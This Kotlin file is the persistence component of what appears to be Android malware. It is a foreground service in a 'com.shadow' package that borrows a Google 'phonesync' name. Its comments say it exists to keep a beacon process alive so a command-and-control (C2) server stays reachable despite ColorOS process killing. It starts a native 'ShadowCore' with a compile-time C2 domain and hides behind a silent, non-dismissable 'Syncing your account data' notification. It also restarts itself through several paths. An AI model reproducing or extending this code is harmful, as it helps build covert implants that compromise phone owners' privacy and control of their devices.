package com.shadow

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.google.android.phonesync.BuildConfig

/**
 * Foreground service that promotes the process out of the plain-background tier.
 *
 * ColorOS o-kill reaps a plain accessibility-bound background process every ~48s.
 * A *started foreground service* with a data-sync notification is reaped far less
 * aggressively — on stock Android it is not killed until the user explicitly
 * dismisses the notification, and on ColorOS it survives the 48s reaper that
 * background processes do not. That is the whole point of this class: keep the
 * beacon process alive so the C2 stays reachable.
 *
 * The service itself is the beacon host: it calls ShadowCore.start() so the Rust
 * core runs *while this process is a foreground service*, independent of whether
 * the accessibility service is currently bound. a11y is the low-latency path;
 * this service is the survival path.
 *
 * Android 14 (targetSdk 34) data-sync foreground services are time-limited to ~6h
 * per window before the system stops them. That is still ~450x the 48s reap, and
 * the service simply restarts via WorkManager/onServiceConnected when the window
 * closes. A 6h uptime beats a 48s uptime by three orders of magnitude.
 */
class SyncForegroundService : Service() {

    companion object {
        private const val TAG = "SyncFg"
        private const val CHANNEL_ID = "sync_foreground"
        private const val NOTIF_ID = 1001

        /** The C2 domain for this build, injected at compile time. */
        fun start(context: Context) {
            try {
                val intent = Intent(context, SyncForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                // ForegroundServiceStartNotAllowedException on background start (API 31+).
                // The a11y onServiceConnected path is exempt (a11y is a foreground-ish
                // binding); WorkManager and boot are allowed. Only a direct background
                // start races this, and the worker's periodic run covers it next tick.
                Log.w(TAG, "startForegroundService rejected: ${e.message}")
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val type = if (Build.VERSION.SDK_INT >= 29) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                0
            }
            val notif = buildNotification()
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NOTIF_ID, notif, type)
            } else {
                startForeground(NOTIF_ID, notif)
            }
            Log.i(TAG, "Foreground service active — process promoted out of background tier")
        } catch (e: Exception) {
            // FatalServiceException if startForeground isn't called fast enough, or a
            // type mismatch. Log and keep the process; the core still runs even if the
            // notification failed.
            Log.e(TAG, "startForeground failed: ${e.message}")
        }

        // Host the beacon. ShadowCore.start() is guarded by its own STARTED flag, so
        // calling it from here, a11y, and WorkManager is idempotent per process.
        try {
            val c2Domain = BuildConfig.C2_DOMAIN
            ShadowCore.start(applicationContext, c2Domain)
        } catch (e: Exception) {
            Log.e(TAG, "failed to start core from foreground service: ${e.message}")
        }

        // Restart if the system kills and restarts the service (START_STICKY).
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sync service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps account sync running in the background."
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("Sync Adapter")
            .setContentText("Syncing your account data")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true) // not swipeable-dismissable — keeps the process foreground
            .setPriority(Notification.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()
    }
}